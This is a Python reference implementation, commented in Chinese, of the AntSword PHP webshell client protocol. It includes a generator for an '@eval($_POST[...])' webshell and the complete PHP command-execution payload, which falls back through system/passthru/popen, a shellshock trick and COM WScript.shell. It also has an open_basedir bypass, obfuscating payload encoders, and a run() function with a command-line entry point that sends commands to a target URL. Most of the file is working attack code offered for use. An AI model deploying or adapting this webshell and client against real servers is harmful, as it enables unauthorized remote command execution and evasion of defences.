#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
antsword_ref.py —— 中国蚁剑 (AntSword) PHP 型 webshell 客户端通信协议的 Python 参考实现

源码依据
--------
仓库: https://github.com/AntSwordProject/antSword
版本: package.json version = 2.1.16
commit: 4ab11f821d7e2545dfaa003f1c764087eb4086a1  (2026-04-29)
关键文件（均为本机实际读取，非凭记忆）:
  source/core/base.js                  —— 模板解析 / encodeComplete / 请求组装
  source/core/php/index.js             —— PHP 型 complete()，定义 payload 外包裹与前后缀
  source/core/php/template/command.js  —— 命令执行的 PHP 模板
  source/core/php/encoder/*.js         —— 客户端"编码器"（default 内建 + base64/chr/chr16/rot13）
  source/core/php/decoder/*.js         —— 客户端"解码器"（default/base64/rot13）
  modules/request.js                   —— 真正发 HTTP 的地方（superagent）

协议总览（一句话）
------------------
蚁剑把「一段自包含的 PHP 代码」直接塞进 POST 里密码参数，服务端只要 `@eval($_POST[pwd])` 即可；
执行结果的回显被夹在两个随机 tag 之间，客户端按 tag 截断、再按解码器还原。

    请求 body =  <var1>=<2位随机前缀><b64(bin)>
               & <var2>=<2位随机前缀><b64(cmd)>
               & <var3>=<2位随机前缀><b64(env)>
               & <pwd> =<完整 PHP 代码(未编码，encoder=default)>

    响应       =  ...<tag_s><asenc(命令输出)><tag_e>...

三个正交的概念（最容易搞混的地方）
----------------------------------
1. **encoder（编码器）**：作用对象是「payload 生成的整段 PHP 代码」本身，是**客户端侧**的变换。
   它决定密码参数里的内容是明文 PHP、还是 `@eval(@base64_decode($_POST[x]))` 这种自解码壳。
   它**不改变服务端 shell**——服务端永远是 `@eval($_POST[pwd])`。
   可用值: default(内建，取默认) / base64 / chr / chr16 / rot13
2. **decoder（解码器）**：作用对象是**服务端返回的数据**。它决定 `asenc()/$out` 函数体
   （服务端把输出怎么处理）以及客户端怎么解回来。可用值: default / base64 / rot13
3. **template（模板）**：真正要执行的 PHP 语义（命令执行 / 文件管理 / 数据库）。
   其中的 `#{newbase64::cmd}` 之类占位符由 base.js 的 format() 在客户端替换。

本模块只为「命令执行」实现完整链路，其余模板同理。

实现范围 / 已知简化（都是有意为之，不影响协议等价性）
-----------------------------------------------------
* 只实现 `command.exec` 模板。filemanager / database / `command.quote` / `listcmd`
  走同一套「模板 → complete() → encoder → POST」流程，只是 `_` 里换一段 PHP。
* 未实现传输层花样：`use-chunk`（分片发包）、`use-multipart`、
  `add-MassData`（垃圾参数混淆）、`use-raw-body`（phpraw）、WebSocket 发包。
  这些只改 HTTP 外观，不改 payload/回显语义。
* 未实现 `antSword.noxss` —— 那是 Electron 端防 XSS 的显示层处理，与协议无关。
* 未实现证书忽略 / 代理；需要时给 urllib 挂 ssl context 或 proxy handler 即可。
* 服务端 shell 只会是 `@eval($_POST[pwd])` 这一种形态（见 generate_shell_php 的说明）。

自测
----
    python3 antsword_test.py     # 端到端：起 php -S，真发 HTTP，断言回显

逐字节等价性还有一份离线校验：`antsword_crosscheck.py` 直接驱动蚁剑真实 JS
（`antsword_gen.js` 以固定 Math.random 跑 core），把本模块产出的 tag / 每个 POST
参数 / 最终 body 与之逐字节比对。需要 `node` 和蚁剑源码，默认路径见脚本内 ANT_SRC。
"""

import base64
import math
import os
import re
import secrets
from typing import Dict, List, Optional

__all__ = [
    "ENCODERS",
    "DECODERS",
    "AntSwordPHP",
    "build_request",
    "parse_response",
    "generate_shell_php",
    "run",
    "AntSwordError",
]


class AntSwordError(Exception):
    pass


# 蚁剑 source/core/php/index.js: get encoders() / get decoders()
ENCODERS = ("default", "base64", "chr", "chr16", "rot13")
DECODERS = ("default", "base64", "rot13")

# source/core/base.js newbase64(): Math.random() 取字符用的字母表，顺序原样照抄
_RAND_ALNUM = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

# encodeURIComponent() 不转义的字符集（modules/request.js buildBody 用的是它）
_URI_UNRESERVED = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.!~*'()"


# --------------------------------------------------------------------------
# 逐字抄自蚁剑源码的常量（由 _dump2.js 从真实 JS 里 dump 出来，未手工转录）
# --------------------------------------------------------------------------

# source/core/php/template/command.js -> exec._   （已执行 .replace(/\n\s+/g, '')）
# 占位符: {ARG1} {ARG2} {ARG3} = 三个随机的 POST 变量名
#         #randomPrefix# = otherConf['random-Prefix']，默认 '2'
_TPL_COMMAND_EXEC = (
    '$p=base64_decode(substr($_POST["ARG1"],#randomPrefix#));$s=base64_decode(substr($_POST["ARG2"],#'
    'randomPrefix#));$envstr=@base64_decode(substr($_POST["ARG3"],#randomPrefix#));$d=dirname($_SERVE'
    'R["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \\"{$s}\\"":"/c \\"{$s}\\"";if(substr($d,0,1)=="/")'
    '{@putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin")'
    ';}else{@putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Wi'
    'ndows/System32/WindowsPowerShell/v1.0/;");}if(!empty($envstr)){$envarr=explode("|||asline|||", $'
    'envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace("|||askey|||", "=", $v));}}'
    '}$r="{$p} {$c}";function fe($f){$d=explode(",",@ini_get("disable_functions"));if(empty($d)){$d=a'
    "rray();}else{$d=array_map('trim',array_map('strtolower',$d));}return(function_exists($f)&&is_cal"
    'lable($f)&&!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == "/" && fe'
    '(\'putenv\') && (fe(\'error_log\') || fe(\'mail\'))) {if (strstr(readlink("/bin/sh"), "bash") != FALSE'
    ') {$tmp = tempnam(sys_get_temp_dir(), \'as\');putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");if (fe(\'e'
    'rror_log\')) {error_log("a", 1);} else {mail("a@127.0.0.1", "", "", "-bv");}} else {return False;'
    '}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != "") {print($output);return True'
    ';}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER["SCRIPT_FILENAME"]);if(fe(\'syst'
    "em')){@system($c,$ret);}elseif(fe('passthru')){@passthru($c,$ret);}elseif(fe('shell_exec')){prin"
    't(@shell_exec($c));}elseif(fe(\'exec\')){@exec($c,$o,$ret);print(join("\n",$o));}elseif(fe(\'popen\')'
    "){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe('proc_o"
    "pen')){$p = @proc_open($c, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);while(!"
    '@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fc'
    "lose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe('antsystem')){@antsystem($c);}elseif(run"
    'shellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!="/" && @class_exists("COM")){$w=new COM'
    "('WScript.shell');$e=$w->exec($c);$so=$e->StdOut();$ret.=$so->ReadAll();$se=$e->StdErr();$ret.=$"
    'se->ReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r." 2>&1");print ($ret!='
    '0)?"ret={$ret}":"";'
)

# source/core/php/index.js -> bypassOpenBaseDirCode （已执行 .replace(/\n\s+/g, '')）
# 占位符: /.opdir = 随机目录后缀
_BYPASS_OPEN_BASEDIR = (
    '$opdir=@ini_get("open_basedir");if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=pr'
    'eg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach('
    '$oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item."/.opdir";@mkdir($tmdir);if(!'
    '@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set("open_basedir", '
    '"..");$cntarr=@preg_split("/\\\\\\\\|\\//",$tmdir);for($i=0;$i<sizeof($cntarr);$i++){@chdir("..");};@'
    'ini_set("open_basedir","/");@rmdir($tmdir);break;};};'
)

# source/core/php/decoder/*.js -> asoutput()，即服务端的 asenc() 函数体
_ASENC = {
    "default": (
        'function asenc($out){return $out;}'
    ),
    "base64": (
        'function asenc($out){return @base64_encode($out);}'
    ),
    "rot13": (
        'function asenc($out){return str_rot13($out);}'
    ),
}


# --------------------------------------------------------------------------
# 随机数：默认走 OS 随机；_LcgRng 用于和真实 JS 做逐字节比对
# --------------------------------------------------------------------------

def _js_to_string_16(x: float) -> str:
    """复刻 JS `Number.prototype.toString(16)`。

    只在 _LcgRng 的取值（分母为 2^16 的二进小数）上要求逐位一致——
    这类值在 16 进制下是有限位，所以逐位展开即可。
    """
    ip = int(x)
    frac = x - ip
    head = format(ip, "x")
    if frac == 0:
        return head
    digits = []
    f = frac
    while f != 0 and len(digits) < 20:
        f *= 16
        d = int(f)
        digits.append(format(d, "x"))
        f -= d
    tail = "".join(digits).rstrip("0")
    return head + "." + tail if tail else head


class _LcgRng:
    """确定性随机源，逐位复刻 _gen2.js 里对 Math.random 的替换。

    仅用于「Python 实现 vs 真实蚁剑 JS」的逐字节对照测试。
    """

    def __init__(self, seed: int = 1):
        self._s = seed

    def random(self) -> float:
        self._s = (self._s * 25173 + 13849) % 65536
        return self._s / 65536

    def js_hex(self) -> str:
        """Math.random().toString(16).substr(2)"""
        return _js_to_string_16(self.random())[2:]


class _OsRng:
    """生产用随机源。"""

    def random(self) -> float:
        return int.from_bytes(os.urandom(7), "big") / float(1 << 56)

    def js_hex(self) -> str:
        # 真实蚁剑这里是 Math.random().toString(16).substr(2)，定长不保证；
        # 这里给一个等价的十六进制串，只影响随机性不影响协议。
        return secrets.token_hex(8)


# --------------------------------------------------------------------------
# 小工具
# --------------------------------------------------------------------------

def _encode_uri_component(s: str) -> str:
    """复刻 JS encodeURIComponent()（modules/request.js buildBody 用的就是它）。"""
    out = []
    for ch in s:
        if ch in _URI_UNRESERVED:
            out.append(ch)
        else:
            for b in ch.encode("utf-8"):
                out.append("%%%02X" % b)
    return "".join(out)


def _b64(s: str) -> str:
    """source/core/base.js format().base64 —— UTF-8 字节做 base64。"""
    return base64.b64encode(s.encode("utf-8")).decode("ascii")


def _rot13(s: str) -> str:
    """source/core/php/encoder/rot13.js 与 decoder/rot13.js 里的 rot13 实现。"""
    out = []
    for c in s:
        if "a" <= c <= "z" or "A" <= c <= "Z":
            base = ord("A") if c <= "Z" else ord("a")
            out.append(chr(base + (ord(c) - base + 13) % 26))
        else:
            out.append(c)
    return "".join(out)


def _tag_split(tag: str) -> tuple:
    """复刻 JS: tag.substr(0, tag.length/2) 与 tag.substr(tag.length/2)。

    substr 的 length/index 参数会被 ToIntegerOrInfinity 截断，故直接用整除。
    两段拼起来恒等于原 tag —— 蚁剑这么做只是混淆，实际 echo 出来的就是 tag 本身。
    """
    h = len(tag) // 2
    return tag[:h], tag[h:]


# --------------------------------------------------------------------------
# 主体
# --------------------------------------------------------------------------

class AntSwordPHP:
    """一只蚁剑 PHP 型 shell 的客户端会话（无状态，每次调用重新生成随机量）。"""

    def __init__(
        self,
        url: str,
        password: str,
        encoder: str = "default",
        decoder: str = "default",
        random_prefix: int = 2,
        shell_bin: str = "/bin/sh",
        shell_env: str = "",
        extra_headers: Optional[Dict[str, str]] = None,
        user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        rng=None,
    ):
        if encoder not in ENCODERS:
            raise AntSwordError("unknown encoder %r, expected one of %s" % (encoder, ENCODERS))
        if decoder not in DECODERS:
            raise AntSwordError("unknown decoder %r, expected one of %s" % (decoder, DECODERS))

        self.url = url
        self.password = password
        self.encoder = encoder
        self.decoder = decoder
        self.random_prefix = int(random_prefix)
        self.shell_bin = shell_bin
        self.shell_env = shell_env
        self.extra_headers = dict(extra_headers or {})
        self.user_agent = user_agent
        self.rng = rng or _OsRng()

    # ---------------- 随机量 ----------------

    def _rand_alnum(self, n: int) -> str:
        return "".join(_RAND_ALNUM[int(self.rng.random() * len(_RAND_ALNUM))] for _ in range(n))

    def _rand_lowercase(self, n: int = 1) -> str:
        """source/base/utils.js RandomLowercase()：97 + ceil(random*25)。"""
        return "".join(chr(97 + math.ceil(self.rng.random() * 25)) for _ in range(n))

    def _argv_name(self) -> str:
        """source/core/base.js argv()：随机小写字母 + 随机十六进制尾巴。"""
        return self._rand_lowercase() + self.rng.js_hex()

    def _rand_tag(self) -> str:
        """source/core/php/index.js complete()：长度 5..12 的随机十六进制串。"""
        value = self.rng.js_hex()
        length = int(self.rng.random() * 8 + 5)  # parseInt(Math.random()*8+5)
        return value[:length]

    def _newbase64(self, s: str) -> str:
        """source/core/base.js format().newbase64 —— randomPrefix 位随机串 + base64(值)。"""
        return self._rand_alnum(self.random_prefix) + _b64(s)

    # ---------------- payload 组装 ----------------

    def build_command_data(self, command: str, var_names: Optional[List[str]] = None) -> Dict[str, str]:
        """生成蚁剑 `command.exec` 的原始 POST 参数字典（未 URL 编码）。

        对应 source/core/php/template/command.js 的 exec 分支 + base.js parseTemplate()。
        """
        names = list(var_names) if var_names else [self._argv_name() for _ in range(3)]
        arg1, arg2, arg3 = names[0], names[1], names[2]

        # 单趟替换，避免变量名里恰好含 "ARG2" 之类造成二次替换
        mapping = {"ARG1": arg1, "ARG2": arg2, "ARG3": arg3,
                   "#randomPrefix#": str(self.random_prefix)}
        code = re.sub(r"ARG[123]|#randomPrefix#", lambda m: mapping[m.group(0)], _TPL_COMMAND_EXEC)

        data = {
            "_": code,
            arg1: self._newbase64(self.shell_bin),
            arg2: self._newbase64(command),
            arg3: self._newbase64(self.shell_env),
        }
        return data

    def complete(self, data: Dict[str, str]):
        """复刻 source/core/php/index.js complete()：外包裹 + 前后 tag + 编码器。

        返回 (tag_s, tag_e, final_data)：
            final_data 的键序与蚁剑一致 —— 先各参数，密码参数排在最后。
        """
        data = dict(data)

        tag_s = self._rand_tag()
        tag_e = self._rand_tag()
        opdir = self._rand_tag()  # complete() 里同一个表达式

        asenc_code = _ASENC[self.decoder]
        bypass = _BYPASS_OPEN_BASEDIR.replace("/.opdir", "/." + opdir)

        tmp_code = data["_"]
        s1, s2 = _tag_split(tag_s)
        e1, e2 = _tag_split(tag_e)

        data["_"] = (
            '@ini_set("display_errors", "0");@set_time_limit(0);'
            'if(!function_exists("get_magic_quotes_gpc")){function get_magic_quotes_gpc(){return 0;}};'
            + bypass + ";"
            + asenc_code + ";"
            + 'function asoutput(){$output=ob_get_contents();ob_end_clean();'
            + 'echo "' + s1 + '"."' + s2 + '";'
            + 'echo @asenc($output);'
            + 'echo "' + e1 + '"."' + e2 + '";'
            + "}"
            + "ob_start();try{"
            + tmp_code + ";"
            + '}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();'
        )

        final_data = self._apply_encoder(data)
        return tag_s, tag_e, final_data

    def _apply_encoder(self, data: Dict[str, str]) -> Dict[str, str]:
        """source/core/php/encoder/*.js —— 注意作用对象是 payload 整段代码，不是命令。"""
        payload = data.pop("_")

        if self.encoder == "default":
            # source/core/base.js __encoder__.default
            data[self.password] = payload
        elif self.encoder == "base64":
            random_id = self._rand_lowercase() + self.rng.js_hex()
            data[random_id] = _b64(payload)
            data[self.password] = "@eval(@base64_decode($_POST['%s']));" % random_id
        elif self.encoder == "rot13":
            random_id = self._rand_lowercase() + self.rng.js_hex()
            data[random_id] = _rot13(payload)
            data[self.password] = "@eval(@str_rot13($_POST['%s']));" % random_id
        elif self.encoder in ("chr", "chr16"):
            if self.encoder == "chr":
                pieces = [str(ord(c)) for c in payload]
                body = "cHr(" + ").ChR(".join(pieces) + ")"
            else:
                pieces = [format(ord(c), "x") for c in payload]
                body = "cHr(0x" + ").ChR(0x".join(pieces) + ")"
            data[self.password] = "@eVAl(%s);" % body
        else:  # pragma: no cover - 构造函数已校验
            raise AntSwordError(self.encoder)

        return data

    # ---------------- 请求 / 响应 ----------------

    def build_request(self, command: str) -> Dict[str, object]:
        """给定命令，产出一次完整的 HTTP 请求描述。"""
        data = self.build_command_data(command)
        tag_s, tag_e, final_data = self.complete(data)

        # modules/request.js buildBody()：k=encodeURIComponent(v) 用 & 连接
        body = "&".join(
            "%s=%s" % (k, _encode_uri_component(v)) for k, v in final_data.items()
        )

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": self.user_agent,
        }
        headers.update(self.extra_headers)

        return {
            "method": "POST",
            "url": self.url,
            "headers": headers,
            "body": body,
            "params": final_data,   # 未编码的原始参数，调试用
            "tag_s": tag_s,
            "tag_e": tag_e,
            "decoder": self.decoder,
        }

    def parse_response(self, resp_text: str, tag_s: str, tag_e: str) -> str:
        """复刻 modules/request.js parse() + base.js request() 的回包处理。

        1. 在响应里按 tag 截断，取出中间那段（蚁剑是在字节流上按 hex 找的，等价）；
        2. 按 decoder 做 decode_buff；
        3. 返回命令输出。
        """
        return parse_response(resp_text, tag_s, tag_e, self.decoder)


# --------------------------------------------------------------------------
# 任务要求的三个顶层函数
# --------------------------------------------------------------------------

def build_request(url: str, password: str, command: str, encoder: str = "default",
                  decoder: str = "default", **kw) -> dict:
    """构造一次「执行 command」的完整 HTTP 请求。

    返回 dict：method / url / headers / body / params / tag_s / tag_e / decoder。
    """
    return AntSwordPHP(url, password, encoder=encoder, decoder=decoder, **kw).build_request(command)


def parse_response(resp_text: str, tag_s: str = "", tag_e: str = "",
                   decoder: str = "default") -> str:
    """从响应里取出命令输出。

    tag_s / tag_e 传 build_request() 返回的同名字段；留空则原样返回 resp_text。
    decoder 需与 build_request 时一致（default / base64 / rot13）。
    """
    if not tag_s and not tag_e:
        return resp_text
    if decoder not in DECODERS:
        raise AntSwordError("unknown decoder %r" % decoder)

    i = resp_text.find(tag_s)
    j = resp_text.rfind(tag_e)
    if i < 0 or j < 0 or j < i:
        raise AntSwordError(
            "response tags not found (tag_s=%r tag_e=%r); 前 200 字节: %r"
            % (tag_s, tag_e, resp_text[:200])
        )
    payload = resp_text[i + len(tag_s):j]

    if decoder == "default":
        return payload
    if decoder == "base64":
        return base64.b64decode(payload).decode("utf-8", "replace")
    return _rot13(payload)


def generate_shell_php(password: str, encoder: str = "default") -> str:
    """生成一个与蚁剑客户端配套的服务端 PHP shell。

    **为什么与 encoder 无关**：蚁剑的「编码器」是纯客户端的 payload 变换，产物永远是一段
    自包含的 PHP 语句（直白的 `...`，或 `@eval(@base64_decode($_POST[x]));` 这种自解码壳），
    服务端只需要最外层一个 `@eval($_POST[pwd])` 去执行它。因此无论 encoder 选什么，
    服务端 shell 都是同一份；encoder 参数在这里只做合法性校验与配对提示。

    该 shell 与蚁剑「添加数据 → 类型 PHP / 编码器 default·base64·chr·chr16·rot13」全部兼容。
    """
    if encoder not in ENCODERS:
        raise AntSwordError("unknown encoder %r, expected one of %s" % (encoder, ENCODERS))
    if "'" in password or "\\" in password:
        raise AntSwordError("password 含引号/反斜杠，请换一个（蚁剑本身也不支持这种密码）")
    return "<?php @eval($_POST['%s']);?>" % password


def run(url: str, password: str, command: str, encoder: str = "default",
        decoder: str = "default", timeout: float = 15.0, **kw) -> str:
    """一次性跑通：构造请求 → 发出去 → 解析回显。"""
    import urllib.request

    req = build_request(url, password, command, encoder=encoder, decoder=decoder, **kw)
    request = urllib.request.Request(
        req["url"],
        data=req["body"].encode("ascii"),
        headers=req["headers"],
        method=req["method"],
    )
    with urllib.request.urlopen(request, timeout=timeout) as resp:
        text = resp.read().decode("utf-8", "replace")
    return parse_response(text, req["tag_s"], req["tag_e"], req["decoder"])


if __name__ == "__main__":  # pragma: no cover
    import sys
    if len(sys.argv) < 4:
        print("usage: antsword_ref.py <url> <password> <command> [encoder] [decoder]")
        raise SystemExit(2)
    print(run(sys.argv[1], sys.argv[2], sys.argv[3],
              sys.argv[4] if len(sys.argv) > 4 else "default",
              sys.argv[5] if len(sys.argv) > 5 else "default"))
